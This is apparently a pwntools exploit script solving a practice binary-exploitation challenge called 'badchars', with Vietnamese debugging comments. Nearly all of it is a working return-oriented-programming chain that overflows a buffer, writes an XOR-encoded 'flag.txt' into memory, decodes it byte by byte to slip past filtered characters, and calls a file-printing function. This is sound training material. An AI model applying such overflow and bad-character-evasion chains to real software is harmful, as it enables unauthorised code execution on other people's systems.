from pwn import *

context.binary = './badchars'
context.log_level = 'debug'

r = process('./badchars')
# cach debug xem stack luc gui payload la dung the nay. Va dua pid vao gef bang lenh attack PID => Xem duoc
payload = b'y' * 40
pop_r14_r15 = p64(0x00000000004006a0) # pop r14 ; pop r15 ; ret
pop_r12_r13_r14_r15 = p64(0x000000000040069c) # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
mov_r12_to_r13 = p64(0x0000000000400634) # mov qword ptr [r13], r12 ; ret
xor_r15_r14 = p64(0x0000000000400628) # xor byte ptr [r15], r14b ; ret
flag = 0x601040 # su dung vmmap de xem vung nho co the ghi chuoi 'flag.txt' vao
string_encrypt = b'dnce,vzv' # xor 0x02 ^ flag.txt

pop_rdi = p64(0x00000000004006a3)
print_file = p64(0x400516)

payload += pop_r12_r13_r14_r15 + string_encrypt + p64(flag) + p64(0x00) + p64(0x00) + mov_r12_to_r13
# xor 0x02 tai vi tri flag de ra duoc chuoi flag.txt
for i in range (8):
	payload += pop_r14_r15
	payload += p64(0x02)
	payload += p64(flag + i)
	payload += xor_r15_r14

payload += pop_rdi + p64(flag) + print_file

r.sendline(payload)
r.interactive()

